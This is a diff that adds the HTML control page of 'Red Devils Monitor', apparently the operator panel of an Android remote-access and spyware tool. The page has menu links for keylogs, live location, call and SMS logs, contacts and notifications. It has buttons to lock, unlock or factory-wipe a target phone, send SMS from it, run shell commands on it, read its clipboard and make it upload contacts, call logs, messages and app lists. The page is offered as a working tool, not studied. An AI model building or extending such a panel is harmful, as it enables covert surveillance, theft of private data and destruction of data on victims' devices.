@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Red Devils Monitor - Remote Tool</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script src="js/theme.js"></script>
+
+</head>
+
+<body style="margin: 0; background-color: #f3f4f6;">
+
+    <div class="layout">
+        <div class="sidebar-overlay"></div>
+        <aside class="sidebar">
+            <a href="index.html" class="brand">
+                <img src="img/logo.jpg" alt="Red Devils"
+                    style="height: 32px; width: 32px; border-radius: 6px; object-fit: cover;">
+                Red Devils
+            </a>
+
+            <div class="nav-title">Menu</div>
+            <a href="index.html" class="nav-link">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                    style="margin-right: 0.75rem;">
+                    <path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
+                    <polyline points="9 22 9 12 15 12 15 22" />
+                </svg>
+                All Devices
+            </a>
+
+            <div class="nav-title" style="margin-top: 2rem;">Device Controls</div>
+            <a href="#" id="link-dashboard" class="nav-link">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                    style="margin-right: 0.75rem;">
+                    <rect width="7" height="9" x="3" y="3" rx="1" />
+                    <rect width="7" height="5" x="14" y="3" rx="1" />
+                    <rect width="7" height="9" x="14" y="12" rx="1" />
+                    <rect width="7" height="5" x="3" y="16" rx="1" />
+                </svg>
+                Dashboard
+            </a>
+            <a href="#" id="link-remote" class="nav-link active">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                    style="margin-right: 0.75rem;">
+                    <path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm0 18a8 8 0 1 1 8-8 8 8 0 0 1-8 8z"></path>
+                    <path d="M12 6a1 1 0 0 0-1 1v2a1 1 0 0 0 2 0V7a1 1 0 0 0-1-1z"></path>
+                    <path d="M12 12a1 1 0 0 0-1 1v4a1 1 0 0 0 2 0v-4a1 1 0 0 0-1-1z"></path>
+                </svg>
+                Remote Tool
+            </a>
+            <a href="#" id="link-location" class="nav-link">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                    style="margin-right: 0.75rem;">
+                    <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                    <circle cx="12" cy="10" r="3"></circle>
+                </svg>
+                Live Location
+            </a>
+            <a href="#" id="link-keylogs" class="nav-link">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                    style="margin-right: 0.75rem;">
+                    <path d="M4 17l6-6-6-6"></path>
+                    <path d="M12 19h8"></path>
+                </svg>
+                Keylogs
+            </a>
+            <a href="#" id="link-info" class="nav-link">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                    style="margin-right: 0.75rem;">
+                    <circle cx="12" cy="12" r="10" />
+                    <path d="M12 16v-4" />
+                    <path d="M12 8h.01" />
+                </svg>
+                System Info
+            </a>
+            <a href="#" id="link-apps" class="nav-link">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                    style="margin-right: 0.75rem;">
+                    <polygon points="12 2 2 7 12 12 22 7 12 2" />
+                    <polyline points="2 17 12 22 22 17" />
+                    <polyline points="2 12 12 17 22 12" />
+                </svg>
+                Installed Apps
+            </a>
+            <a href="#" id="link-calls" class="nav-link">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                    style="margin-right: 0.75rem;">
+                    <path
+                        d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
+                </svg>
+                Call Logs
+            </a>
+            <a href="#" id="link-sms" class="nav-link">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                    style="margin-right: 0.75rem;">
+                    <path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z" />
+                </svg>
+                SMS Logs
+            </a>
+            <a href="#" id="link-contacts" class="nav-link">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                    style="margin-right: 0.75rem;">
+                    <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2" />
+                    <circle cx="12" cy="7" r="4" />
+                </svg>
+                Contacts
+            </a>
+            <a href="#" id="link-notifications" class="nav-link">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                    style="margin-right: 0.75rem;">
+                    <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" />
+                    <path d="M13.73 21a2 2 0 0 1-3.46 0" />
+                </svg>
+                Notifications
+            </a>
+            <a href="https://github.com/Red-Devils-pro" target="_blank" class="nav-link"
+                style="margin-top: auto; color: #4b5563;">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                    style="margin-right: 0.75rem;">
+                    <path
+                        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+                    </path>
+                </svg>
+                My GitHub
+            </a>
+        </aside>
+
+        <main class="content">
+            <div class="mobile-header">
+                <button class="mobile-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M4 6h16M4 12h16M4 18h16" />
+                    </svg>
+                </button>
+                <div class="mobile-brand">
+                    <img src="img/logo.jpg" alt="Red Devils"
+                        style="height: 28px; width: 28px; border-radius: 4px; object-fit: cover;">
+                    Red Devils
+                </div>
+                <div style="width: 24px;"></div> <!-- Spacer -->
+            </div>
+            <div id="loading">Loading...</div>
+
+            <div id="dashboard-content" style="display: none;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 2rem;">
+                    <div>
+                        <h1 id="device-name" style="margin: 0;">Remote Tool</h1>
+                        <p id="device-id" style="color: #6b7280; margin: 0.5rem 0 0 0;">ID: ...</p>
+                    </div>
+                    <div id="connection-status" class="status-badge">Connecting...</div>
+                </div>
+
+                <div class="grid-container"
+                    style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem;">
+
+                    <!-- Hardware Actions -->
+                    <div class="card">
+                        <h3><i class="fas fa-bolt" style="color: #f59e0b; margin-right: 0.5rem;"></i>Hardware Actions
+                        </h3>
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-top: 1rem;">
+                            <button class="btn"
+                                style="background: linear-gradient(135deg, #8b5cf6 0%, #6366f1 100%); color: white;"
+                                onclick="window.sendVibrate()">
+                                <i class="fas fa-vibration" style="margin-right: 8px;"></i> Vibrate
+                            </button>
+                            <button class="btn"
+                                style="background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white;"
+                                onclick="window.sendTorch(true)">
+                                <i class="fas fa-lightbulb" style="margin-right: 8px;"></i> Torch ON
+                            </button>
+                            <button class="btn"
+                                style="background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%); color: white;"
+                                onclick="window.sendTorch(false)">
+                                <i class="fas fa-power-off" style="margin-right: 8px;"></i> Torch OFF
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Security Actions -->
+                    <div class="card">
+                        <h3><i class="fas fa-shield-alt" style="color: #dc2626; margin-right: 0.5rem;"></i>Security
+                            Actions</h3>
+                        <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 1rem;">Requires
+                            "Display over other apps" permission.</p>
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
+                            <button class="btn"
+                                style="background: linear-gradient(135deg, #ef4444 0%, #b91c1c 100%); color: white;"
+                                onclick="window.sendLock()">
+                                <i class="fas fa-lock" style="margin-right: 8px;"></i> LOCK
+                            </button>
+                            <button class="btn"
+                                style="background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white;"
+                                onclick="window.sendUnlock()">
+                                <i class="fas fa-lock-open" style="margin-right: 8px;"></i> UNLOCK
+                            </button>
+                            <button class="btn"
+                                style="background: linear-gradient(135deg, #000000 0%, #374151 100%); color: white; grid-column: span 2;"
+                                onclick="window.sendWipe()">
+                                <i class="fas fa-skull-crossbones" style="margin-right: 8px;"></i> WIPE DATA (Factory
+                                Reset)
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Popups & Alerts -->
+                    <div class="card">
+                        <h3><i class="fas fa-comment-dots" style="color: #3b82f6; margin-right: 0.5rem;"></i>Popups &
+                            Alerts</h3>
+
+                        <div style="margin-top: 1rem;">
+                            <label style="font-size: 0.9rem; color: var(--text-secondary);">Toast Message</label>
+                            <div style="display: flex; gap: 0.5rem; margin-top: 0.25rem;">
+                                <input type="text" id="toast-message" placeholder="Message..."
+                                    style="flex: 1; padding: 0.5rem; border: 1px solid var(--border-color); border-radius: 4px;">
+                                <button class="btn btn-primary" onclick="window.sendToast()"><i
+                                        class="fas fa-paper-plane"></i></button>
+                            </div>
+                        </div>
+
+                        <div style="margin-top: 1rem;">
+                            <label style="font-size: 0.9rem; color: var(--text-secondary);">System Notification</label>
+                            <div style="display: flex; gap: 0.5rem; margin-top: 0.25rem;">
+                                <input type="text" id="notification-message" placeholder="Notification content..."
+                                    style="flex: 1; padding: 0.5rem; border: 1px solid var(--border-color); border-radius: 4px;">
+                                <button class="btn btn-primary" onclick="window.sendNotification()"><i
+                                        class="fas fa-bell"></i></button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="margin-top: 1rem;">
+                        <label style="font-size: 0.9rem; color: var(--text-secondary);">Text to Speak</label>
+                        <div style="display: flex; gap: 0.5rem; margin-top: 0.25rem;">
+                            <input type="text" id="speak-message" placeholder="Text to speak..."
+                                style="flex: 1; padding: 0.5rem; border: 1px solid var(--border-color); border-radius: 4px;">
+                            <button class="btn btn-primary" onclick="window.sendSpeak()"><i
+                                    class="fas fa-volume-up"></i></button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- SMS Sender -->
+                <div class="card" style="grid-column: 1 / -1;">
+                    <h3><i class="fas fa-sms" style="color: #10b981; margin-right: 0.5rem;"></i>Send SMS</h3>
+                    <div
+                        style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-top: 1rem;">
+                        <div>
+                            <label style="font-size: 0.9rem; color: var(--text-secondary);">SIM Card</label>
+                            <select id="sms-sim"
+                                style="width: 100%; padding: 0.6rem; margin-top: 0.25rem; border: 1px solid var(--border-color); border-radius: 4px;">
+                                <option value="">Default / Auto</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label style="font-size: 0.9rem; color: var(--text-secondary);">Target Number</label>
+                            <input type="tel" id="sms-phone" placeholder="+1234567890"
+                                style="width: 100%; padding: 0.6rem; margin-top: 0.25rem; border: 1px solid var(--border-color); border-radius: 4px;">
+                        </div>
+                    </div>
+                    <div style="margin-top: 1rem;">
+                        <label style="font-size: 0.9rem; color: var(--text-secondary);">Message Body</label>
+                        <textarea id="sms-message" rows="3" placeholder="Type your message here..."
+                            style="width: 100%; padding: 0.6rem; margin-top: 0.25rem; border: 1px solid var(--border-color); border-radius: 4px; resize: vertical;"></textarea>
+                    </div>
+                    <button class="btn btn-primary" style="margin-top: 1rem; width: 100%;" onclick="window.sendSms()">
+                        <i class="fas fa-paper-plane" style="margin-right: 0.5rem;"></i> Send SMS Now
+                    </button>
+                </div>
+
+                <!-- Terminal / Shell -->
+                <div class="card" style="grid-column: 1 / -1;">
+                    <h3><i class="fas fa-terminal" style="color: #4b5563; margin-right: 0.5rem;"></i>Remote Shell</h3>
+                    <div id="terminal-output"
+                        style="background-color: #1e1e1e; color: #00ff00; font-family: monospace; padding: 1rem; height: 200px; overflow-y: auto; border-radius: 4px; margin-top: 1rem; white-space: pre-wrap; font-size: 0.9rem;">
+                        Welcome to Remote Shell...</div>
+
+                    <div style="display: flex; gap: 0.5rem; margin-top: 1rem;">
+                        <span style="padding: 0.6rem; color: #4b5563; font-family: monospace;">$</span>
+                        <input type="text" id="shell-input" placeholder="Enter command (e.g., ls, ping 8.8.8.8)"
+                            style="flex: 1; padding: 0.6rem; border: 1px solid var(--border-color); border-radius: 4px; font-family: monospace;">
+                        <button class="btn btn-primary" onclick="window.sendShell()"><i class="fas fa-play"></i>
+                            Run</button>
+                    </div>
+                </div>
+
+                <!-- Clipboard Manager -->
+                <div class="card" style="grid-column: 1 / -1;">
+                    <h3><i class="fas fa-clipboard" style="color: #6b7280; margin-right: 0.5rem;"></i>Clipboard Manager
+                    </h3>
+                    <div style="margin-top: 1rem;">
+                        <label style="font-size: 0.9rem; color: var(--text-secondary);">Current Clipboard</label>
+                        <div style="display: flex; gap: 0.5rem; margin-top: 0.25rem;">
+                            <input type="text" id="clipboard-display" readonly
+                                placeholder="Click 'Get Clipboard' to fetch..."
+                                style="flex: 1; padding: 0.6rem; border: 1px solid var(--border-color); border-radius: 4px; background-color: #f9fafb;">
+                            <button class="btn btn-outline" onclick="window.getClipboard()"><i class="fas fa-sync"></i>
+                                Get</button>
+                        </div>
+                    </div>
+                    <div style="margin-top: 1rem;">
+                        <label style="font-size: 0.9rem; color: var(--text-secondary);">Set Clipboard</label>
+                        <div style="display: flex; gap: 0.5rem; margin-top: 0.25rem;">
+                            <input type="text" id="clipboard-input" placeholder="Text to copy to device..."
+                                style="flex: 1; padding: 0.6rem; border: 1px solid var(--border-color); border-radius: 4px;">
+                            <button class="btn btn-primary" onclick="window.setClipboard()"><i class="fas fa-copy"></i>
+                                Set</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Data Fetchers -->
+                <div class="card" style="grid-column: 1 / -1;">
+                    <h3><i class="fas fa-sync" style="color: #6366f1; margin-right: 0.5rem;"></i>Data Synchronization
+                    </h3>
+                    <p style="color: var(--text-secondary); font-size: 0.9rem;">Trigger the device to upload the latest
+                        data immediately.</p>
+                    <div style="display: flex; gap: 1rem; flex-wrap: wrap; margin-top: 1rem;">
+                        <button class="btn btn-outline" onclick="sendCommand('get_contacts')"><i
+                                class="fas fa-address-book" style="margin-right: 0.5rem"></i> Contacts</button>
+                        <button class="btn btn-outline" onclick="sendCommand('get_call_log')"><i class="fas fa-phone"
+                                style="margin-right: 0.5rem"></i> Call Logs</button>
+                        <button class="btn btn-outline" onclick="sendCommand('get_sms_log')"><i
+                                class="fas fa-comment-alt" style="margin-right: 0.5rem"></i> SMS Logs</button>
+                        <button class="btn btn-outline" onclick="sendCommand('get_installed_apps')"><i
+                                class="fas fa-th-large" style="margin-right: 0.5rem"></i> Apps</button>
+                        <button class="btn btn-outline" onclick="sendCommand('get_system_info')"><i
+                                class="fas fa-info-circle" style="margin-right: 0.5rem"></i> System Info</button>
+                    </div>
+                </div>
+
+            </div>
+    </div>
+    </main>
+    </div>
+
+    <script src="js/firebase_config.js"></script>
+    <script src="js/remote.js"></script>
+    <script src="js/integrity.js"></script>
+    <script src="js/ui.js"></script>
+
+    <script>
+        if (typeof init === 'function') {
+            init();
+        } else {
+            document.addEventListener('DOMContentLoaded', () => {
+                if (typeof init === 'function') init();
+            });
+        }
+    </script>
+</body>
+
+</html>
